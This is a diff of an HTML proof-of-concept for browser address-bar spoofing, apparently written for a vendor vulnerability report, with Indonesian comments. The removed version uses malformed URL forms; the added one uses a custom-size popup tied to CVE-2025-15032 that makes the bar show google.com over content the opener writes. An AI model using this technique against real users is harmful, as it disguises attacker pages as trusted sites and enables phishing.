@@ -1,65 +1,14 @@
-<!-- MEKANISME: URL sintaktis ganjil (slash tunggal / port kosong / titik dua ganda) tidak pernah commit; opener menulis about:blank popup selagi bar melukis bentuk mentahnya. -->
-<meta charset="utf-8">
-<title>5 - Hang via URL sintaktis ganjil (Knob A)</title>
-<style>
-body{font:15px/1.6 system-ui,Segoe UI,Arial,sans-serif;margin:24px;max-width:780px;color:#111}
-code{background:#eee;padding:2px 5px;border-radius:3px;word-break:break-all}
-.box{border:1px solid #ccc;border-left:5px solid #666;padding:2px 14px;margin:14px 0;background:#fafafa}
-.v{color:#a00}.s{color:#060}
-button,select{font:15px inherit;padding:9px 12px;margin:6px 8px 6px 0;cursor:pointer}
-#log{min-height:1.6em;font-weight:600}
-</style>
-
-<h2>5 &mdash; Hang via URL sintaktis ganjil (Knob A)</h2>
-
-<p>URL asli halaman ini: <code id="here"></code></p>
-
-<div class="box">
-<p><b>Mekanisme:</b> bentuk URL yang ganjil (slash tunggal, slash rangkap tiga, port kosong, titik dua ganda, port di luar rentang). Bila parser/loader tidak menghasilkan dokumen, popup tetap memegang <code>about:blank</code> milik opener dan opener menulis isinya.</p>
-<p class="v"><b>VULNERABLE:</b> address bar popup melukis bentuk mentah yang dipilih di bawah, padahal badan halaman melaporkan <code>location.href</code> aslinya <code>about:blank</code>.</p>
-<p class="s"><b>SECURE:</b> browser menormalkan URL lalu commit (bar menampilkan bentuk kanonik dari dokumen yang benar-benar dimuat) <i>atau</i> menolak URL dan bar tetap <code>about:blank</code>.</p>
-</div>
-
-<p>Bentuk uji:
-<select id="form">
-  <option value="https:/google.com">https:/google.com (slash tunggal)</option>
-  <option value="https:///google.com">https:///google.com (slash rangkap tiga)</option>
-  <option value="https://google.com:">https://google.com: (port kosong)</option>
-  <option value="https://google.com::443/">https://google.com::443/ (titik dua ganda)</option>
-  <option value="https://google.com:99999/">https://google.com:99999/ (port di luar rentang)</option>
-</select>
-</p>
-
-<button id="run">Jalankan mekanisme (bentuk ganjil)</button>
-<button id="ctrl">Lengan KONTROL (https://google.com/ kanonik)</button>
-
-<p id="log"></p>
-<p>Jalur kode kedua tombol identik; satu-satunya variabel adalah bentuk sintaksis URL.</p>
-
+<!-- 05 - popup CUSTOM-SIZE (bentuk CVE-2025-15032)   [address-bar spoofing | macOS: Dia macOS (fix >=1.9.0) / Arc]
+     MEKANISME : jendela custom-size adalah bentuk persis yang diperbaiki Dia 1.9.0; di sini state-nya bukan commit melainkan navigasi PENDING.
+     PREDIKAT  : bilah jendela kecil menulis https://www.google.com padahal dokumennya about:blank tulisan penyerang.
+     AMAN      : jendela menampilkan about:blank (perilaku pasca-fix).
+     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
+                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
+                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
+<meta charset="utf-8"><title>05 popup CUSTOM-SIZE (bentuk CVE-2025-15032)</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var GOOD = 'https://google.com/';
-document.getElementById('here').textContent = location.href;
-function log(m){ document.getElementById('log').textContent = m; }
-function paint(w, label){
-  try{
-    w.document.write('<meta charset="utf-8"><title>DEMO MARKER</title>'
-      + '<body style="font:16px/1.5 sans-serif;padding:24px">'
-      + '<div style="font-size:32px;font-weight:700">DEMO MARKER</div>'
-      + '<p>' + label + '</p>'
-      + '<p>Teks ini ditulis oleh opener, bukan oleh server mana pun.</p>'
-      + '<p>location.href dokumen ini: <b id="u">?</b></p>'
-      + '<p>Bandingkan dengan address bar jendela ini.</p>'
-      + '<script>setInterval(function(){document.getElementById("u").textContent=location.href},300)<\/script>');
-    w.document.close();
-    log('Dokumen ditulis. Screenshot address bar popup + badan popup.');
-  }catch(e){ log('Tulis DITOLAK (dokumen sudah commit ke origin lain) = perilaku SECURE.'); }
-}
-function go(url,label){
-  var w; try{ w = window.open(url,'_blank','width=780,height=460'); }
-  catch(e){ log('window.open menolak URL ini = perilaku SECURE (' + e + ')'); return; }
-  if(!w){ log('Popup diblokir atau URL ditolak - izinkan popup lalu ulangi.'); return; }
-  setTimeout(function(){ paint(w,label); }, 60);
-}
-document.getElementById('run').onclick  = function(){ var u = document.getElementById('form').value; go(u,'lengan UJI - ' + u); };
-document.getElementById('ctrl').onclick = function(){ go(GOOD,'lengan KONTROL - ' + GOOD); };
+var T='https://www.google.com:9090/';o.textContent='REAL: '+location.origin;
+function go(){var w=window.open('','','width=480,height=620,left=200,top=120');setInterval(function(){w.location.replace(T);},9800);w.document.write('<h3>BUKAN google.com - ditulis '+location.origin+'</h3>');}
 </script>
